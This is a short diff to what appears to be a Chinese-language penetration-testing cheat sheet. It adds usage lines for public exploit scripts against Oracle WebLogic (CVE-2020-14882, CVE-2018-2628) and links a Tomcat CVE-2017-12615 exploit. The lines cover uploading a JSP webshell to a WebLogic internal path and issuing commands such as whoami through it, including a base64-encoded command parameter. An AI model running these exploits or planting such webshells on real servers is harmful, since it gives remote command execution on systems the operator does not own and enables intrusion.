@@ -22,8 +22,9 @@ python3 CVE-2020-14882.py -u http://targetip:port
 use :
 python2 CVE-2018-2628-Getshell.py targetip port shell1.jsp
 Getshell: http://192.168.235.128:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg== (Payload是Base64encode,會在Web上面回顯)
-
-
+python2 cve-2018-2628.py
+set shell >> http://192.168.235.128:7001/bea_wls_internal/shell1.jsp (指定Webshell位置)
+cmd >> whoami (直接回顯在terminal)
 
 # Tomcat
 https://github.com/1337g/CVE-2017-12615
